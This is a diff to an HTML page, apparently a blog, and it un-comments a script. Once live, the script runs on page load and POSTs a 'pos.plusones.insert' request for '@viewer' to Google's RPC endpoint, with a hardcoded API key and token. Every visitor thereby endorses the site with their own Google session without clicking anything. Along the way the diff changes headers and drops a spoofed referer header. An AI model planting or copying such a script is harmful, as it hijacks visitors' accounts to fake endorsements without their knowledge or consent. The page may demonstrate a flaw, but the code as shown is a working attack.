@@ -85,6 +85,7 @@ xhr.send(null);
 </script>
 
 <p><a href="https://www.facebook.com/sharer.php?u=http%3A%2F%2Funhandledexpression.com&t=Unhandled%20Expression">Google+ share</a> Count: <span id="gpluscount">0</span></p>
+
 <g:plusone></g:plusone>
 
 <script type="text/javascript">
@@ -98,10 +99,12 @@ xhr.send(null);
 	var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
   })();
 </script>
-<!--
+
 <script type="text/javascript">
 var url = "http%3A%2F%2Funhandledexpression.com";
-var payload = "[ {\"apiVersion\": \"v1\", \"id\" : \"p\", \"jsonrpc\" : \"2.0\", \"key\" : \"p\", \"method\"  : \"pos.plusones.get\", \"params\"  : [   \"nolog\" : \"true\",\"id\" : \"http%3A%2F%2Ftestupide.net\", \"source\" : 'widget', \"container\" : \"http%3A%2F%2Ftestupide.net\", \"userId\" : \"@viewer\", \"groupId\" : \"@self\"] }]";
+//var payload = "[ {\"apiVersion\": \"v1\", \"id\" : \"p\", \"jsonrpc\" : \"2.0\", \"key\" : \"p\", \"method\"  : \"pos.plusones.insert\", \"params\"  : {   \"nolog\" : \"true\",\"id\" : \"http://unhandledexpression.com\", \"source\" : 'widget', \"container\" : \"http://unhandledexpression.com\", \"userId\" : \"@viewer\", \"groupId\" : \"@self\"} }]";
+
+var payload = "[{\"method\":\"pos.plusones.insert\",\"id\":\"pos.plusones.insert\",\"params\":{\"cdx\":\"3c1b41\",\"id\":\"http://unhandledexpression.com\",\"source\":\"widget\",\"track\":\"[[[null,[2,null,[],0,450]],[[null,null,[]]],[[null,null,[]]],[[null,null,[]]],[[null,null,[]]]]]\",\"container\":\"http://unhandledexpression.com\",\"abtk\":\"AEIZW7Sm3xZiwrKbTGv+FieMq6RAW91z3iM7s8IjQqw3it5+qNZPEJS3ZvpwNHweM1mPcoV0uhbChWg0AGSiJ/XK/VGNoOlvJ37nU+ceniRaqO71B2FDCPU=\",\"userId\":\"@viewer\",\"groupId\":\"@self\"},\"jsonrpc\":\"2.0\",\"key\":\"pos.plusones.insert\",\"apiVersion\":\"v1\"}]";
 var xhr2 = new XMLHttpRequest();
 //
 xhr2.onreadystatechange = function() {
@@ -112,11 +115,11 @@ xhr2.onreadystatechange = function() {
         }
 };
 
-xhr2.open("POST","https://clients6.google.com/rpc?key=AIzaSyCKSbrvQasunBoV16zDH9R33D88CeLr9gQ", false);
-xhr2.setRequestHeader("Content-type", "text-plain");
-xhr2.setRequestHeader("X-Referer", "testupide.net");
+xhr2.open("POST","https://clients6.google.com/rpc?key=AIzaSyCKSbrvQasunBoV16zDH9R33D88CeLr9gQ", true);
+xhr2.setRequestHeader("Content-type", "application/json");
+//xhr2.setRequestHeader("X-Referer", "testupide.net");
 xhr2.send(payload);
 </script>
--->
+
 </body>
 </html>
